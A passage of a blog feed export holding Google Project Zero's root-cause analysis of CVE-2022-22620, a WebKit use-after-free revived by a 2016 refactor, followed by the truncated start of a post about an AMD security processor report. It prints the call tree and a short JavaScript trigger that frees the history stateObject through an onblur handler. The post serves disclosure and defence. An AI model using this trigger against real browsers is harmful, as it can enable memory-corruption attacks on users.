class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;{&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;*&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;stateObject &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;}&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;:&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;SerializedScriptValue&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;nullValue&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;());&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;The callback to user code would have to occur prior to the call to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;statePopped&lt;/span&gt;&lt;span&gt;&amp;nbsp;because &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&amp;nbsp;was cast to a reference there and thus would now be reference-counted. We assumed that this would be the place where the &amp;ldquo;freed&amp;rdquo; object was &amp;ldquo;used&amp;rdquo;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;If you go down the rabbit hole of the calls made in &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;, we find that there is a path to the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;blur&lt;/span&gt;&lt;span&gt;&amp;nbsp;event being dispatched. We could have also used a tool like &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://codeql.github.com/\"&gt;CodeQL&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to see if there was a path from &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;dispatchEvent&lt;/span&gt;&lt;span&gt;, but in this case we just used manual auditing. The call tree to the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;blur&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&amp;nbsp;event is:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.870849a2bc6536879e2f5ddf1089bb7c44ea4edb\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"ZslSztaQWN-c27\"&gt;&lt;tr class=\"ZslSztaQWN-c15\"&gt;&lt;td class=\"ZslSztaQWN-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;FrameLoader&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;loadInSameDocument&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;FrameLoader&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;scrollToFragmentWithParentBoundary&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;FrameView&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;scrollToFragment&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;FrameView&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;scrollToFragmentInternal&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;FocusController&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;setFocusedElement&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;FocusController&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;setFocusedFrame&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dispatchWindowEvent&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;Event&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;create&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;eventNames&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;().&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;blurEvent&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;Event&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;CanBubble&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;No&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;Event&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;IsCancelable&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;::&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;No&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;));&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;blur&lt;/span&gt;&lt;span&gt;&amp;nbsp;event fires on an element whenever focus is moved from that element to another element. In our case &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;is triggered when we need to scroll to a new location within the current page. If we&amp;rsquo;re scrolling and therefore changing focus to a new element, the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;blur&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&amp;nbsp;event is fired on the element that previously had the focus. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;The last piece for our trigger is to free the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;onblur&lt;/span&gt;&lt;span&gt;&amp;nbsp;event handler. To do that we call &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;replaceState&lt;/span&gt;&lt;span&gt;, which overwrites the current history state with a new object. This causes the final reference to be dropped on the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;and it&amp;rsquo;s therefore free&amp;rsquo;&lt;/span&gt;&lt;span&gt;d&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;still uses the free&amp;rsquo;d &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;in its call to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;statePopped&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b75e8b9268f5881526cd63ea2dc82bafaef64a9f\"&gt;&lt;/a&gt;&lt;a id=\"t.5\"&gt;&lt;/a&gt;&lt;table class=\"ZslSztaQWN-c27\"&gt;&lt;tr class=\"ZslSztaQWN-c15\"&gt;&lt;td class=\"ZslSztaQWN-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;input &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;=&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;document&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;body&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;appendChild&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;document&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;createElement&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c20\"&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;a &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;=&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;document&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;body&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;appendChild&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;document&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;createElement&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;a&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;id &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;=&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c20\"&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;pushState&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;state1&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;location &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;+&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;#foo&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;pushState&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;state2&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c20\"&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;setTimeout&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(()&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;=&amp;gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; input&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;focus&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; input&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;onblur &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;=&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;()&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;=&amp;gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;replaceState&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;state3&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; setTimeout&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(()&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;=&amp;gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;back&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(),&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c3\"&gt;1000&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;},&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c3\"&gt;1000&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c20\"&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;In both the 2013 and 2022 cases, the root vulnerability is that the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not correctly reference-counted. In 2013, the developers did a great job of patching all the different paths to trigger the vulnerability, not just the one in the submitted proof-of-concept. This meant that they had also killed the vulnerability in &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;. The refactoring in December 2016 then revived the vulnerability to enable it to be exploited in-the-wild and re-patched in 2022.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ZslSztaQWN-c31 ZslSztaQWN-c19\" id=\"h.x9lxjo77j0n3\"&gt;&lt;span class=\"ZslSztaQWN-c8 ZslSztaQWN-c6\"&gt;Conclusion&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;Usually when we talk about variants, they exist due to incomplete patches: the vendor doesn&amp;rsquo;t correctly and completely fix the reported vulnerability. However, for CVE-2022-22620 the vulnerability was correctly and completely fixed in 2013. &lt;/span&gt;&lt;span&gt;Its &lt;/span&gt;&lt;span&gt;fix was just regressed&lt;/span&gt;&lt;span&gt;&amp;nbsp;in 2016&lt;/span&gt;&lt;span&gt;&amp;nbsp;during refactoring&lt;/span&gt;&lt;span&gt;. We don&amp;rsquo;t know how long an attacker was exploiting this vulnerability in-the-wild, but we do know that the vulnerability existed (again) for 5 years: December 2016 until January 2022.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;There&amp;rsquo;s no easy answer for what should have been done differently. The developers responding to the initial bug report in 2013 followed a lot of best-practices: &lt;/span&gt;&lt;/p&gt;&lt;ul class=\"c22 lst-kix_ziaggw1wsf95-0 start\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;Patched all paths to trigger the vulnerability, not just the one in the proof-of-concept. This meant that they patched the variant that would become CVE-2022-22620.&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;Submitted a test case with the patch.&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;Detailed commit messages explaining the vulnerability and how they were fixing it.&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;Additional hardening measures during deserialization.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ZslSztaQWN-c11 ZslSztaQWN-c41\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;As an offensive security research team, we can make assumptions about what we believe to be the core challenges facing modern software development teams: legacy code, short reviewer turn-around expectations, refactoring and security efforts are generally under-appreciated and under-rewarded, and lack of memory safety mitigations. Developers and security teams need time to review patches, especially for security issues, and rewarding these efforts, will make a difference. It also will save the vendor resources in the long run. In this case, 9 years after a vulnerability was initially triaged, patched, tested, and released, the whole process had to be duplicated again, but this time under the pressure of in-the-wild exploitation. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;While this case study was a 0-day in Safari/WebKit, this is not an issue unique to Safari. Already in 2022, we&amp;rsquo;ve seen in-the-wild 0-days that are variants of previously disclosed bugs targeting Chromium, Windows, Pixel, and iOS as well.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It&amp;rsquo;s a good reminder that as defenders we all need to stay vigilant in reviewing and auditing code and patches. &lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/2485989426162409270/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/06/an-autopsy-on-zombie-in-wild-0-day.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/2485989426162409270"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/2485989426162409270"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/06/an-autopsy-on-zombie-in-wild-0-day.html","@title":"An Autopsy on a Zombie In-the-Wild 0-day"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-6171588576768270104","published":"2022-05-10T12:00:00.001-07:00","updated":"2022-06-08T14:08:01.466-07:00","title":{"@type":"text","#text":"Release of Technical Report into the AMD Security Processor"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;ol{margin:0;padding:0}table td,table th{padding:0}.RmvCPDuePa-c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.RmvCPDuePa-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.RmvCPDuePa-c7{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.RmvCPDuePa-c2{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.RmvCPDuePa-c6{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.RmvCPDuePa-c4{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.RmvCPDuePa-c1{color:inherit;text-decoration:inherit}.RmvCPDuePa-c5{border:1px solid black;margin:5px}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom: